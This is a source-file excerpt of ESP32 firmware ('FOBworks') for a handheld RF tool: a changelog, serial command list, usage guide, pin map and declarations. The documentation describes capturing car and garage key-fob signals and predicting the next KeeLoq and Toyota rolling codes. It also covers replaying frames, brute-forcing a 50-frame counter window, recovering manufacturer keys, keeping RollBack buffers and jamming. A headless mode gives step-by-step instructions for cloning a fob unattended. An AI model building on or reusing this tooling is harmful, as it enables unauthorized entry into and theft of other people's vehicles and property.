//   Bug 2 — End-of-capture artifact.  With the phase corrected (ds=38), bits 0-38 decode
//   perfectly but b=39 reads cbuf[116]=1185 µs (4.8T, index 116 out of 119) — an RSSI tail
//   artifact that does not fit either 1T or 2T → ok=false.
//
//   Fix: try both ds and ds+1 (one-pulse phase retry) in the data decode loop.  Within each
//   attempt accept the result if only the last 1-2 bits (b≥38) fail, treating them as 0.
//   The serial≠0 and entropy 8-32 checks that follow still guard against false decodes.
//   Result: Lexus LS300 correctly decodes to serial=0x108000 / btn=2 / ctr=0x10A.
//
// v3.48 (2026-07-20) — Toyota Ch-B (315 MHz) KeeLoq false-positive gate.
//   Same root cause as v3.46 Ch-A fix: ks_klPwm extracts 66+ bits from long Toyota-Denso
//   Ch-B captures and ks_parseKL passes by chance.  Evidence: Lexus LS300 at 314.65 MHz
//   produced 3 KeeLoq decodes with serials 28670, 324, and 32961 from the same single fob
//   (impossible — one fob has one fixed serial).  Fix: extend te_kl_skip with
//   (toyotaB && te_toy && bLen > 160) — real KeeLoq frames at 315 MHz are 66–130 bits;
//   Toyota-Denso Ch-B false positives are 161–280 bits.
//
// v3.47 (2026-07-19) — 2FSK KeeLoq false-positive gate.
//   KeeLoq is an OOK (PWM) protocol and physically cannot appear in a 2FSK capture.
//   When fskCapMode=true, ks_klPwm+ks_parseKL occasionally matched a random 66-bit run in
//   the NRZ bit stream, producing a spurious "KeeLoq" entry with a different serial number
//   on every press (confirmed via Ford EU 433.92 MHz captures: serials 22529 and 8193 on the
//   same fob session).  Fix: extend te_kl_skip with fskCapMode.
//
// v3.46 (2026-07-18) — Toyota Ch-A KeeLoq false-positive gate + Toyota pre-filter fix.
//   Toyota Denso 312.2 MHz preamble produced sparse-hop KeeLoq false positives
//   (2-9/32 hop bits set vs expected ~16).  Added te_kl_skip = toyotaA && te_toy.
//   Also fixed Toyota pulse pre-filter to properly gate the decoder order.
//
// v3.42 (2026-06-21) — KeeLoq decoder improvements + EU garage brands.
//   · HCS101 structural detection, Magic Serial Type 1/2/3 learning algorithms,
//     byte-reversed key fallback (UNKNOWN-type), Subaru EU 433.92 MHz profile.
//   · EU gate & garage brands added to FC_V (DoorHan/NICE/Hormann/Sommer/FAAC/BFT/Beninca).
//   · MAX_DERIVED_KEYS bumped to N_MFR_KEYS × 14 for 5 new derivation modes per key.
//
// v3.41 (2026-06-20) — Stack-overflow crash elimination + auto-scan TWDT fix.
//   Root-cause analysis confirmed three independent stack consumers that together pushed the
//   ESP32 loop() task (8 kB) over the edge on dual-band Toyota paths:
//
//   [CRITICAL] MfrKey derived[MAX_DERIVED_KEYS] → static
//     · 400 entries × 12 B = 4.8 kB stack-allocated every ks_klPredict() call.
//       On a back-to-back Toyota retry the combined frame depth exceeded 8 kB.
//       Moved to BSS with `static`; safe because ks_klPredict is loop()-task-only.
//
//   [FIX] uint16_t rawBuf[CAP_SZ] → static in captureSignal (1 kB freed per call).
//
//   [FIX] uint32_t tmp[CAP_SZ] → static in captureSignal (2 kB freed, coherence-gate path).
//
//   [FIX] yield() every 6 iterations in auto-scan fallback sweep — prevents TWDT on combined
//     timeoutMs/2 wait + re-arm capture paths that could reach 5+ s without a yield.
//
// v3.40 (2026-06-18) — FOBclone headless mode (double-tap).
//   · LED state machine: blue breathe (scanning) → amber blink (1st capture) →
//     green flash + two-tone beep (ready to replay).
//   · Ignores fixed-code protocols; rolling-code fobs (predict.window>0) advance state.
//   · Single-tap while ready fires: replayPredicted() + replaySeq(3) + replaySeq(50).
//   · Captures saved to NVS with "hfc":true tag; re-emitted to dashboards on next boot.
//   · Context-sensitive single tap: FOBclone ready → replay; scanning → cycle freq preset;
//     idle → toggle FOBscan headless.
//   · Heartbeat: hfc_active + hfc_state fields added.
//   · New serial command: {"cmd":"fobclone_scan","on":true|false}.
//
// v3.39 (2026-06-18) — FOBscan headless mode + button gesture engine.
//   · Single-tap from idle captures and saves any RF signal to NVS (orange breathing LED).
//   · Freq preset cycling: idx 0 NA (300–320 MHz), idx 1 EU (433–435 MHz), idx 2 ALL.
//   · NVS signal library (namespace "hslib") — up to 8 compact signal JSONs, re-emitted
//     to dashboards on every boot via hsLib_emitAll().
//   · Button gesture engine: 400 ms quiet-window disambiguation; hold ≥3 s → light sleep.
//   · Serial commands: headless on/off, freq_preset, hs_clear, hs_list.
//
// v3.36 (2026-06-14) — Toyota-band secondary noise filter.
//   · Second-pass removes all edges < 150 µs (RSSI tails / GDO0 ringing that break the
//     preamble pair detector).  Non-Toyota bands unaffected (their TE floor is as low as 90 µs).
//   · too_short threshold lowered 80 → 60 edges; 60–79-edge captures now attempt Ch-A/Ch-B
//     soft-ID heuristic instead of short-circuiting.
//
// v3.35 (2026-06-14) — Toyota RSSI edge sensitivity improvements.
//   · edgeThr lowered noiseFloor+8 → noiseFloor+5 for Toyota-band (309–316 MHz); margin at
//     –65 dBm jumps 2 → 5 dBm above edgeThr.
//   · RSSI in-loop 100 µs minimum-pulse guard — sub-100 µs crossings (threshold oscillations)
//     no longer consume rawBuf slots or reduce cnt.
//
// v3.34 (2026-06-14) — add an SX1278 reset before Toyota-band capture and retry short results.
//   · At the time, reset was believed to release GDO0. Later measurements showed the
//     CC1101 GDO0 is not routed on this board; see v3.72.
//   · After a "too_short" result scanTick retries captureSignal() up to 2×; best result
//     (decoded or highest edge count) goes to the signal library.
//
// v3.33 (2026-06-14) — "too_short" confidence level + Ch-B soft-ID + burst dedup hash.
//   · cnt<80: emits confidence:"too_short" with edge count note ("only N edges; need 80+").
//     Applied in km-bypass, km=true fast-exit, and #1j end-of-chain soft-ID.
//   · Toyota km=true fast-exit — cnt<80 exits immediately as "too_short".
//   · Ch-B soft-ID (#1k-B) — undecoded 314-315 MHz captures tagged Toyota-Denso / channel:B
//     / confidence:"possible" instead of falling silently to OOK-raw.
//   · Burst dedup pulse-hash — FNV-1a hash of first 16 pulse widths added to duplicate guard.
//
// v3.27 (2026-06-13) — Toyota-Denso LO-pulse tolerance fix.
//   · Data-bit loop: drop LO-pulse tolerance checks; classify bits solely by HI pulse (±35%).
//     CC1101 RSSI lag inflates LO periods 50–150% at -59 to -65 dBm, causing is0/is1 to fail
//     on the very first data bit when lag exceeds 70%/80%.  Sync gap (≥3×TE) already consumed
//     by ds=j+2 step; no long gap pulse can enter the 40-bit window.
//
// v3.26 (2026-06-13) — Toyota Ch-A soft-ID ratio guard removed.
//   · Removed ratio>=1.6&&<=2.4 from km=true path — when CC1101 RSSI lag inflates 2T LO
//     pulses >120%, cB/cA exceeds 2.4 and all decoders miss.  At 312 MHz (toyotaA) no
//     garage protocol is deployed; constraint was redundant.  Simplified to !decoded && toyotaA && te_toy.
//   · OOK fallback now emits diag_cA / diag_cB / diag_ratio fields.
//
// v3.25 (2026-06-13) — Toyota-Denso decoder hardening.
//   · TE upper limit widened 560 → 700 µs (covers Land Cruiser / early IS300 TE≈650 µs).
//   · Preamble minimum lowered 4 → 3 pairs (CC1101 fires mid-preamble).
//   · te_toy ceiling raised 600 → 700 µs to match decoder.
//   · Toyota Ch-A soft-ID — equal-preamble captures in 311.5–313.5 MHz now labelled
//     "Toyota-Denso / Ch-A / heuristic" instead of "OOK-raw".
//   · PT2262 false-positive suppression: !toyotaDual guard added to te_pt and PT2262-Manchester.
//
// v3.24 (2026-06-13) — KeeLoq crypto algorithm fix (critical).
//   · ks_klEncrypt and ks_klDecrypt both used wrong NLF tap positions, failing all 3 published
//     KeeLoq test vectors.  Replaced with the AN1064 algorithm: NLF taps at bits
//     1,9,20,26,31; 528 rounds forward (encrypt) / backward (decrypt).
//   · ks_klSelfTest() now passes all 3 vectors at boot.
//   · Impact: hop prediction and all 10 manufacturer key-derivation modes previously produced
//     wrong results; both features now functional.
//
// v3.23 (2026-06-13) — KeeLoq SN formula fix + decoder guards.
//   · KeeLoq SN: sn = ((uint32_t)disc<<4)|(f.btn&0xF), guard disc!=0; rolling counter removed.
//   · Toyota-Denso entropy gate — accepts only 8–32 transitions (rejects noise).
//   · PT2262/EV1527 alternating-code filter — rejects frames with >73% transition rate.
//   · GDO0 glitch filter — 15 µs debounce on GDO0 digital capture path.
//
// v3.22 (2026-06-12) — Toyota-Denso sync gap + LO tolerance widening.
//   · Sync gap increased 200 → 350 ms; LO tolerance widened ±45→±70% / ±50→±80%.
//   · PT2262-Manchester mc==0 filter added.
//
// v3.21 (2026-06-12) — Toyota-Denso sync gap upper bound fix.
//   · GQ4-52T and 2018+ remotes use a 9–15 ms sync gap; old te*22 bound (8.8 ms for
//     TE=400 µs) rejected them → first "data" pulse was the long LO → ok=false on every press.
//     New range: te*3…28 000 µs.
//
// v3.20 (2026-06-12) — Toyota-Denso TE floor fix.
//   · Toyota 2018+ (GQ4-52T) use TE≈200 µs; old te0<250 guard silently rejected all
//     sub-250 µs preamble starts → every GQ4-52T fell through to OOK-raw.
//   · ks_decodeToyota te0 floor 250 → 150 µs; te_toy flag cA floor 250 → 150 µs.
//   · te_lin: !(toyotaA||toyotaB) guard added to block Linear-10 false positives at 314 MHz.
//
// v3.19 (2026-06-12) — Toyota-Denso / KeeLoq RSSI lag tolerance fix.
//   · Preamble and bit-decode tolerances widened: HI ±35% / LO ±50% (was ±30% both).
//     TE now calculated from HI pulses only to eliminate lag bias.
//   · Trigger threshold noiseMax+10 (was +14); Toyota at −66 dBm fires reliably.
//   · Capture diagnostics: first 12 pulse widths logged via addLog after each capture.
//
// v3.18 (2026-06-12) — Toyota k-means bypass + KeeLoq boundary fix.
//   · Equal-width pulse trains (all widths within ±15% of mean) skip k-means coherence gate
//     so Toyota preamble bursts are not discarded as noise.
//   · KeeLoq decoder boundary fix: pi+90 → pi+79 (closed 11-bit gap allowing Manchester
//     noise to slip past the preamble length check).
//
// v3.17 (2026-06-11) — Vehicle DB frequency corrections + FOBclone replay suite.
//   · All vehicle DB frequencies signal-file verified across all profiles.
//   · FOBclone replay suite: targeted bruteforce (counter-step window from latest frame)
//     added to raw / dual-band / predicted / sequence / 50-candidate suite.
//
// v3.16 (2026-06-11) — Vehicle DB comprehensive update (signal-file verified).
//   · 5 new profiles: gm_433, honda_433, nissan_433, vw_na, mazda_433 (EU).
//   · 10 new makes: Genesis, Volkswagen NA, Peugeot/Citroen, Renault, Opel/Vauxhall,
//     Fiat/Alfa Romeo, Volvo, Honda EU, Mazda EU, Nissan EU.
//   · GM 433 MHz split at 2014+ / 2017-2019+; Honda NA 315→433 MHz at 2018.
//   · Nissan Rogue 2021+, Pathfinder/QX60 2022+ → nissan_433.
//   · Hyundai/Kia year boundaries corrected; Palisade/Telluride/Seltos/Kona added.
//   · VW/Audi EU 433 MHz boundary extended to 2019; BMW corrected to 2013.
//   · VEHICLES C array: Honda→Honda-RKE 433/315, Nissan→315/433 dual, Mazda→315 primary.
//
// v3.15 (2026-06-11) — Mode select overlay + FOBclone guided walk-through.
//   · Mode select overlay on dashboard load — FOBscan and FOBclone cards.
//   · FOBclone guided walk-through: make → model → year → capture + replay.
//     Vehicle DB (FC_V / FC_P): 14 manufacturers, 60+ models, NA + EU.
//     Auto-arm: fcArm() calls /api/cap_mode?fsk=, /api/sweep_range, /api/scan_toggle.
//     Replay suite: raw, dual-band, predicted, next-N, 50-candidate, targeted bruteforce.
//
// v3.14 (2026-06-10) — KeeLoq key-derivation modes expanded (8 → 10).
//   · Mode 9: AN1064 DECRYPT — ks_klDecrypt(sn|0x20,mk) / ks_klDecrypt(sn|0x60,mk).
//   · Mode 10: Magic XOR Type-1 (Beninca and compatible clone chips) — devKey=(sn28<<32|sn28)^mfrKey.
//   · MAX_DERIVED_KEYS bumped to 400 (N_MFR_KEYS × 10).
//   · ks_klSelfTest() added — verifies KL_ENCRYPT + KL_DECRYPT against 3 reference
//     vectors on every boot; PASS/FAIL emitted to Serial.
//   · ks_klPredict user-key path now tries (a) direct, (b) ENC-normal, (c) DEC-normal,
//     (d) XOR-type1 in order with early-exit.
//
// v3.13 (2026-05-xx) — 7 new decoder functions.
//   · CAME-24, Nice-FLO-12, Nice-FLO-24, FAAC-SLH, Phoenix-V2, CAME-Atomo,
//     Security+ 2.0 (ternary framing, mix inversion, base-3 symbols).
//
// ── SERIAL COMMANDS (JSON, 115200 baud) ───────────────────────────────────────
// Every serial command must include the per-device bearer token:
//   {"cmd":"capture","token":"<dashboard access code>"}
// Examples below omit "token" only for readability.
//   {"cmd":"capture"}               — capture & decode one burst
//   {"cmd":"capture","f":433.92}    — capture on specific frequency (MHz)
//   {"cmd":"decode"}                — decode last captured buffer
//   {"cmd":"replay"}                — retransmit last captured burst
//   {"cmd":"replay_predicted"}      — replay next predicted rolling frame
//   {"cmd":"replay_seq","n":3}      — replay sequence of N predicted frames
//   {"cmd":"replay_stop"}           — halt ongoing replay sequence
//   {"cmd":"scan"}                  — report current sweep statistics
//   {"cmd":"scan_toggle"}           — pause / resume auto-scan sweep
//   {"cmd":"setfreq","f":868.35}    — lock RF to a specific frequency
//   {"cmd":"squelch","dbm":-60}     — set auto-capture threshold (dBm)
//   {"cmd":"key_recover"}           — attempt full MFR-key search (needs 2+ frames)
//   {"cmd":"key_probe","key":"...","name":"label"}  — test a candidate key
//   {"cmd":"add_user_key","n":"label","k":"HEX64"}  — save a device key to NVS
//   {"cmd":"del_user_key","idx":0}  — remove a saved key by index
//   {"cmd":"key_list"}              — list all saved user keys
//   {"cmd":"key_clear"}             — erase all saved user keys
//   {"cmd":"save"}                  — save last capture to SD card (if inserted)
//   {"cmd":"status"}                — battery, frequency, scan state, uptime
//   {"cmd":"cap_mode","fsk":true}   — switch capture to 2FSK demodulation (KIA/HYU V0)
//   {"cmd":"cap_mode","fsk":false}  — restore OOK capture (default)
//   {"cmd":"headless","on":true}      — start FOBscan headless scan (saves to NVS)
//   {"cmd":"headless","on":false}     — stop FOBscan headless scan
//   {"cmd":"fobclone_scan","on":true} — start FOBclone headless (rolling-code fob detect)
//   {"cmd":"fobclone_scan","on":false}— stop FOBclone headless
//   {"cmd":"freq_preset","idx":0}     — set freq preset: 0=NA 1=EU 2=ALL (saved to NVS)
//   {"cmd":"hs_clear"}                — erase all NVS headless-captured signals
//   {"cmd":"hs_list"}                 — re-emit all headless library signals to dashboard
//
// ── BUTTON GESTURES ───────────────────────────────────────────────────────────
//   Single tap   → context-sensitive:
//                  FOBclone ready  → replay (predicted + seq + 50-frame bruteforce)
//                  FOBclone active → cycle freq preset (adjust scan band)
//                  Idle / FOBscan  → toggle FOBscan headless (orange breathe)
//   Double-tap   → toggle FOBclone headless (blue breathe / amber blink / green flash)
//   Hold ≥3 s    → power off → light sleep (hold ≥3 s again to wake)
//
// ── HEADLESS OPERATION ────────────────────────────────────────────────────────
//   The device can capture and replay fob signals completely standalone — no
//   phone, laptop, or dashboard connection required.  Two independent headless
//   modes are available, activated by the physical button on the device.
//
//   ┌─ FOBscan Headless (single tap from idle) ─────────────────────────────┐
//   │  LED: orange breathing pulse while active                              │
//   │  · Scans all frequencies (or the current preset band) continuously.   │
//   │  · Every decoded signal is saved to internal flash (NVS, up to 8).   │
//   │  · A short beep confirms each capture.                                │
//   │  · Single-tap again to exit; LED returns to steady green.             │
//   │  · Saved signals are re-emitted to any connected dashboard on the     │
//   │    next USB or WiFi connection, appearing in the signal library.      │
//   │  Use for: passive RF logging, leaving the device unattended to        │
//   │  capture signals in an area, then reviewing on a dashboard later.     │
//   └───────────────────────────────────────────────────────────────────────┘
//
//   ┌─ FOBclone Headless (double-tap from idle) ────────────────────────────┐
//   │  Watches specifically for rolling-code vehicle fobs.                  │
//   │  Fixed-code signals (gate remotes, EV1527, PT2262, etc.) are          │
//   │  silently ignored — only KeeLoq / Toyota / VAG / Chrysler /           │
//   │  Security+ and similar rolling protocols advance the state machine.   │
//   │                                                                        │
//   │  Step 1 — Arm  (double-tap)                                           │
//   │    LED: blue breathing.  Device is sweeping and listening.            │
//   │                                                                        │
//   │  Step 2 — First fob press                                             │
//   │    LED: amber rapid blink.  Rolling-code captured; counter seen.      │
//   │    Counter delta is unknown — device needs a second press to learn    │
//   │    how many steps the counter advances per press.                     │
//   │                                                                        │
//   │  Step 3 — Second fob press                                            │
//   │    LED: fast green flashes + two-tone beep.  Delta resolved.          │
//   │    Device is now READY.                                               │
//   │                                                                        │
//   │  Step 4 — Replay  (single tap while green)                            │
//   │    Device fires three replay methods in order:                        │
//   │      1. Predicted frame  — counter rebuilt with known delta           │
//   │      2. Sequence sweep   — next 3 predicted counter frames            │
//   │      3. Bruteforce window— 50-frame targeted counter window           │
//   │    LED flashes cyan during transmission, returns to green.            │
//   │    Single-tap again to replay a second time if needed.               │
//   │                                                                        │
//   │  Exit: double-tap at any point to stop FOBclone headless mode.       │
//   │  Both captured signals are saved to NVS (tagged hfc:true) and        │
//   │  will appear in the signal library on next dashboard connection.      │
//   │                                                                        │
//   │  Freq preset:  while FOBclone is in SCANNING or NEEDS_MORE state,    │
//   │  single-tap cycles the frequency preset (NA 300-320 → EU 433-435 →   │
//   │  ALL 300-928 MHz) so the sweep can be limited to the target vehicle.  │
//   └───────────────────────────────────────────────────────────────────────┘
//
//   NVS library: namespace "hslib" — up to 8 signals (oldest overwritten).
//   Erase: {"cmd":"hs_clear"}  |  Re-emit to dashboard: {"cmd":"hs_list"}
//   Or use the freq-preset serial command: {"cmd":"freq_preset","idx":0}
//     idx 0 = NA (300–320 MHz)   idx 1 = EU (433–435 MHz)   idx 2 = ALL
//
// ── HARDWARE PIN MAP ──────────────────────────────────────────────────────────
//   CC1101 : MOSI=35  MISO=33  SCK=36  CS=34  GDO0 not routed to an ESP32 GPIO
//   LoRa   : Ra-02 SX1278  CS=38  RST=47  DIO0=48
//            GPIO 26 is reserved for a later SX1262 and is unused on this card.
//   SD     : CS=10
//   RGB LED: GPIO 5               Buzzer : GPIO 1
//   Button : GPIO 37 (SW3)        Sensor rail: GPIO 6, high while awake
//   I²C    : SDA=8  SCL=9         Gauge: MAX17048 at 0x36
//   NFC    : PN532 on I²C (SDA=8  SCL=9) — on the SGP Card Mini, unused by this firmware
//   IR TX  : GPIO 7               — on the SGP Card Mini, unused by this firmware
//   Mic    : ICS-43434 WS/SD/SCK = 2/3/4 — on the card, unused by this firmware
//   BOOT   : GPIO 0 (SW1)         — left to the ROM
//
// ═══════════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════════
// ─── Arduino IDE — Board & Partition Setup ────────────────────────────────────
//
//  Board     :  "ESP32S3 Dev Module"  (esp32 by Espressif ≥ 3.x)
//  CPU Freq  :  240 MHz
//  Flash Size:  8MB (QIO 80MHz)
//  PSRAM     :  Disabled. OPI PSRAM would take GPIO 33–37.
//  Partition :  "Huge APP (3MB No OTA/1MB SPIFFS)"  ← required for full firmware
//  USB Mode  :  "Hardware CDC and JTAG"
//  USB CDC   :  Enabled on boot
//  Upload    :  921600 baud
//
//  Required Libraries — Sketch → Include Library → Manage Libraries:
//    · Adafruit NeoPixel  ≥ 1.12.x
//    · ArduinoJson        7.x     (uses JsonDocument + to<> API)
//    · SD, SPI, Wire, Preferences, DNSServer, WiFi  (bundled with ESP32 core)
//
// ═══════════════════════════════════════════════════════════════════════════════

#include <Arduino.h>

#include <WiFi.h>
#include <WebServer.h>
#include <esp_http_server.h>   // WebSocket command/event transport (port 81)
#include <DNSServer.h>
#include <SPI.h>
#include <Wire.h>
#include <SD.h>
#include <Adafruit_NeoPixel.h>
#include <ArduinoJson.h>
#include <driver/ledc.h>
#include <driver/gpio.h>
#include <esp_sleep.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include <Preferences.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEServer.h>
#include <BLESecurity.h>
// esp_gap_ble_api.h — required for esp_ble_auth_cmpl_t (BleSecCb) and bond-device APIs.
// Core 2.x: header directory is a standalone -I entry → angle brackets work directly.
// Core 3.x: only the SDK root (include/) is on the path; the Bluedroid API dir is a
//           subdirectory — use the full relative path from that root.
#if   __has_include(<esp_gap_ble_api.h>)
  #include <esp_gap_ble_api.h>
#elif __has_include("esp_gap_ble_api.h")
  #include "esp_gap_ble_api.h"
#elif __has_include(<bt/host/bluedroid/api/include/api/esp_gap_ble_api.h>)
  #include <bt/host/bluedroid/api/include/api/esp_gap_ble_api.h>
#elif __has_include(<host/bluedroid/api/include/api/esp_gap_ble_api.h>)
  #include <host/bluedroid/api/include/api/esp_gap_ble_api.h>
#endif
#include <driver/twai.h>

// ─── Pins (DO NOT CHANGE) ─────────────────────────────────────────────────────
#define PIN_MOSI         35
#define PIN_MISO         33
#define PIN_SCK          36
#define PIN_CC1101_CS    34
#define PIN_GDO0         48
#define PIN_LORA_CS      38
#define PIN_LORA_RST     47
#define PIN_LORA_DIO0    48   // Shared with CC1101 GDO0. May 2026 module is an SX1278.
#define PIN_SD_CS        10
#define PIN_LED           5
#define PIN_BUZZ          1
#define PIN_SENSOR_CE     6
#define PIN_BTN          37
#define MAX17048_ADDR  0x36
#define RGB_N             1

// ─── Config ───────────────────────────────────────────────────────────────────
#define FW_VER        "FOBworks for SGP v3.82"
// Minimum battery voltage under which a CC1101 TX burst is refused (PA current spike
// can otherwise sag a weak pack below the MCU brown-out threshold mid-transmission).
#define TX_BATT_FLOOR_V 3.30f
#define AP_SSID       "SGP Card Mini"
#define CAP_SZ         512
// research/23 §2.1: the import body limit expressed in pulses. A corpus .sub runs 4.38 bytes
// per pulse (verified: 297934 bytes / 67977 pulses), so an 8192-byte body carries ~1869
// pulses. The parser cap and every import staging buffer must match this, or the accepted
// body is wider than what can be searched -- which is how a 512-pulse cap ended up refusing
// the corpus the import was written for.
// Matches SUB_REPLAY_MAX_BODY_BYTES at 4.38 bytes/pulse (16384 / 4.38 = 3740). The two
// limits must move together: the instruction raised only the pulse cap to 1868, which is
// the correct figure for an 8192-byte body but still short of the first frame at 2517, so
// the stated goal ("posting the corpus file's head must import successfully") would not
// have been met. See research/23 §4 step 1.
#define SUB_REPLAY_MAX_PULSES 3740
// Largest serial command line accepted. Was an inline 255, which silently discarded any
// longer command -- see the note at the read loop. Sized for the widest command the firmware
// takes; the import's pulse list is the largest, and its handler bounds that payload.
#define SERIAL_CMD_MAX 8192
uint32_t serialRxQueueActual=0;   // what setRxBufferSize() actually achieved (0 = failed)
// Stack instrumentation (research/28 §3.2). There was none, which is why the first real
// frame had to crash to reveal the limit. uxTaskGetStackHighWaterMark(NULL) returns the
// MINIMUM free stack (in words) since the task started, i.e. the worst case so far -- so after
// one bench session the value IS the measurement, and a regression shows as a shrinking
// number rather than a canary trip.
// NOTE: uxTaskGetStackHighWaterMark() counts in StackType_t units, and on this port
// portSTACK_TYPE is uint8_t (portmacro.h: #define portSTACK_TYPE uint8_t) -- so the raw value
// is ALREADY IN BYTES. An earlier version multiplied by 4 (assuming 32-bit words) and reported
// 118864 "bytes" free on a 32 KB stack, which is impossible; that inconsistency is what
// exposed the unit error. Kept the raw name explicit so the mistake is not repeated.
uint32_t stackHwmMinBytes=0xFFFFFFFFu;   // smallest free-stack figure seen (BYTES)
uint32_t stackHwmAfterDecode=0;          // free stack right after the last decodeSignal() (BYTES)
String   resetReasonStr="unknown";       // why the last reset happened; PANIC means a crash
// NOTE: stackSample() is defined further down, after this sketch's type declarations. A
// function defined here would be hoisted by the sketch preprocessor above them and fail to
// compile -- the same ordering trap SET_LOOP_TASK_STACK_SIZE hit (see loop_stack.cpp).
#define MAX_KEYS         8
#define KEY_SZ         256
#define HIST_SZ         32
#define SCAN_DWELL_MS   45
#define CAP_TIMEOUT_MS 8000
#define KL_NLF    0x3A5C742EUL

static const float FOB_FREQS[] = {
  // ── 300 MHz band (NA – Chrysler, Dodge, Jeep, older GM) ─────────────────
  299.50f, 300.00f, 300.50f,
  // ── 303-304 MHz band (NA/EU – various OEMs) ──────────────────────────────
  303.50f, 303.87f, 304.25f,
  // ── 310 MHz band (Honda, Nissan, Infiniti – 2000s NA) ────────────────────
  309.75f, 310.00f, 310.25f,
  // ── 312-314 MHz band (Subaru, Mitsubishi, some Hyundai NA) ───────────────
  312.20f, 312.90f, 313.00f, 314.65f, 314.89f,
  // ── 315 MHz band (dominant NA – Toyota, Ford, GM, Honda, Mazda) ──────────
  314.35f, 315.00f, 315.65f,
  // ── 318 MHz band (GM, Pontiac, Saturn) ───────────────────────────────────
  317.75f, 318.00f, 318.25f,
  // ── 390 MHz band (older Honda / Acura NA) ────────────────────────────────
  389.75f, 390.00f, 390.25f,
  // ── 418 MHz band (older UK / AU vehicles) ────────────────────────────────
  417.75f, 418.00f, 418.25f,
  // ── 433-434 MHz band (dominant EU/Asia – VW, BMW, Mercedes, Renault) ─────
  433.42f, 433.67f, 433.92f, 434.17f, 434.42f,
  // ── 868 MHz band (newer EU – Audi, BMW, Ford, Jaguar, Land Rover) ────────
  867.75f, 868.00f, 868.30f, 868.35f, 868.65f,
  // ── 915 MHz band (newer NA – Honda, Subaru, Lincoln) ─────────────────────
  914.75f, 915.00f, 915.25f,
};
#define N_FREQS 39

// ─── Global State ─────────────────────────────────────────────────────────────
Adafruit_NeoPixel rgb(RGB_N, PIN_LED, NEO_GRB + NEO_KHZ800);
WebServer srv(80);
DNSServer  dnsServer;


String deviceApPassword;
String deviceApiToken;
bool deviceCredentialsReady = false;
bool ledReinit = false, systemON = true;
float battV = 0, battPct = 0;
bool cc1101OK = false;
uint8_t cc1101Version = 0;
bool sdMounted = false;
unsigned long decodeFlashUntil = 0;
bool fskCapMode = false;     // true → 2FSK demodulation; false → OOK (default)
float curFreq = 433.92;

uint16_t rfBuf[CAP_SZ];
int      rfLen  = 0;
float    rfFreq = 0;
int      rfRssi = -100;
bool     lastCapGdo0 = false;   // true=GDO0 digital mode, false=RSSI mode (diagnostic)
String   lastDecode = "";
uint32_t lastCapDurMs = 0;    // wall-clock duration of the most recent captureSignal() call (ms)

// ─── Capture polarity (06 §3.4a) ─────────────────────────────────────────────
// rfBuf stores pulse WIDTHS only, so the level of each pulse is not in the buffer
// and must be carried alongside it. The level of rfBuf[0] is all that is needed,
// because pulses alternate: rfBuf[i] is HIGH when (i%2)==rfStartHigh, LOW
// otherwise. Everything that replays or exports a capture depends on this.
//
// Why it matters: both export sites and replayRaw() used to hard-assert that
// rfBuf[0] is HIGH (export wrote +width for even indices; replayRaw began with
// st=true). A capture that really began LOW was therefore exported and replayed
// with every level inverted, which no receiver would accept. This is reachable
// in practice: the 75 µs glitch filter drops a leading narrow pulse, and merging
// absorbs its duration into the next one, so the first retained pulse can be LOW.
// KIA V3 N1 RAW.sub is exactly that case (a 55 µs HIGH lead-in is dropped, so its
// first retained pulse is LOW).
//
// The value is the level of the first RETAINED pulse, after filtering, because
// that is what rfBuf[0] holds. Set by captureSignal(); consumed by the SD save
// path, /api/sub_export, and replayRaw().
bool     rfStartHigh = true;    // level of rfBuf[0] (and of even indices)
bool     rfStartHighB = true;   // same, for the Channel B buffer


// ── Fast-hop scan mode ────────────────────────────────────────────────────────
// When fastHopActive=true, scanDwellMs() returns fastHopDwellMs for every
// channel, cycling the full automotive band faster than the adaptive-dwell mode.
// Enabled by /api/fast_hop or serial { cmd:"fast_hop", en:1 }.
bool     fastHopActive  = false;
uint16_t fastHopDwellMs = 80;    // dwell per channel while fast-hop is on (ms)

// ── Dual-band Channel B buffer ─────────────────────────────────────────────
// Loaded by the dual-follow capture when a Toyota/NA-band Ch A signal is caught.
// rfBufB persists until overwritten by a new follow-capture session.
// rfLenB == 0 means no Ch B capture is available.
uint16_t rfBufB[CAP_SZ];
int      rfLenB  = 0;
float    rfFreqB = 0.0f;

// ─── FOBback capture buffer — stores up to 5 raw captures for RollBack replay ─
// Armed via /api/fbk_arm (HTTP) or {"cmd":"fbk_arm"} (serial/WS).
// Each capture entry holds the raw OOK/FSK pulse array, length, freq, and timestamp.
#define FBK_MAX 5
// sh = level of w[0]; see rfStartHigh. Stored so a replay after any delay still
// transmits correct levels. Defaults true for entries built by protocol generators.
// ctr/hasCtr: the rolling counter this capture decoded to, when the decoder
// supplied one. Used by fbkCtrOrder() to reject two entries carrying the SAME code,
// which cannot produce a valid RollBack sequence (research/10 §2.5).
struct FbkEntry { uint16_t w[CAP_SZ]; int len; float freq; uint32_t ts; bool sh;
                  uint32_t ctr; bool hasCtr;
                  // trimmed = the block was reduced to ONE frame. Only Kia V3/V4 has a
                  // measured frame boundary, so for every other protocol the raw
                  // multi-repeat block is kept and this is false. C1/C2 are only
                  // correct when this is true, which is why rbArm/rjArm gate on it and
                  // report "untrimmed-block" rather than failing silently
                  // (research/12 §2/§3 P1).
                  bool trimmed; };
static FbkEntry fbkBuf[FBK_MAX];
static int      fbkCount = 0;
static bool     fbkArmed = false;


// Forward declarations: startJam/stopJam/replayRaw/cc_setCapture*/captureSignal are
// defined with the other radio helpers further down. The Arduino auto-prototype
// block does not cover this because it is emitted above the first function, which is
// earlier.
void startJam(float mhz);
void stopJam();
void jamTick();          // keeps a FIFO-driven jam alive; called from loop()
static void cc_setCaptureOOK();
bool replayRaw(float mhz,uint16_t* data,int len,int reps,bool startHigh);
bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int reps);
// Extra wall-clock budget for the EDGE phase only (ms). 0 = the 3000 ms default.
// Set immediately before a capture that needs a short window, then it self-clears on
// the next capture. See the note at the head of captureSignal().
uint32_t capMaxMsOverride = 0;

// Whether this board revision actually routes the CC1101's GDO0 to a readable GPIO. Off by
// default, because on this revision it does not: GPIO 48 is the SX1278's DIO0, so a pin that
// toggles is not evidence the signal came from the CC1101. It governs all three paths that
// could otherwise be fooled by a toggle -- jam, replay, and capture.
//
// Set true only on a board where GDO0 really is wired. `research/14` records the measurement and
// the vendor firmware says the same; neither is a reason to probe for it at runtime, because a
// probe cannot tell the two chips' pins apart.
